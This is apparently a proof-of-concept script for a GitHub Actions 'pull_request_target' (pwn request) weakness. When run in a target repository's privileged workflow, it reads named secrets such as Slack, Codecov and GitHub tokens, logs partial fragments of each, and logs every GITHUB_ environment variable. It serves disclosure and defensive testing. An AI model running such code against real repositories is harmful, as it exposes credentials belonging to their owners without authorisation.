function redact(v) {
  if (!v) return "<missing — not injected into env>";
  if (v.length < 8) return `[present, length=${v.length}]`;
  return `${v.slice(0, 6)}...${v.slice(-4)} (length=${v.length})`;
}

console.log("=== PWN REQUEST POC — pull_request_target secret exposure ===");
console.log(`Triggered by: ${process.env.GITHUB_EVENT_NAME}`);
console.log(`Actor: ${process.env.GITHUB_ACTOR}`);
console.log(`Repo: ${process.env.GITHUB_REPOSITORY}`);
console.log(`Workflow: ${process.env.GITHUB_WORKFLOW}`);
console.log(`Runner: ${process.env.RUNNER_NAME}`);
console.log("");
console.log("--- Secrets accessible in this privileged context ---");

const targets = {
  SLACK_BOT_TOKEN: process.env.SLACK_BOT_TOKEN,
  SLACK_WEBHOOK_TRIGGER: process.env.SLACK_WEBHOOK_TRIGGER,
  SLACK_CHANNEL_ID: process.env.SLACK_CHANNEL_ID,
  CODECOV_TOKEN: process.env.CODECOV_TOKEN,
  CODECOV_API_TOKEN: process.env.CODECOV_API_TOKEN,
  GITHUB_TOKEN: process.env.GITHUB_TOKEN,
};

let found = 0;
for (const [k, v] of Object.entries(targets)) {
  const display = redact(v);
  console.log(`  ${k}: ${display}`);
  if (v) found++;
}

console.log("");
console.log(
  `Result: ${found}/${Object.keys(targets).length} secrets accessible`,
);
console.log("--- All GITHUB_ env vars ---");
for (const [k, v] of Object.entries(process.env).filter(([k]) =>
  k.startsWith("GITHUB_"),
)) {
  console.log(`  ${k}: ${v}`);
}
console.log("=== END POC ===");
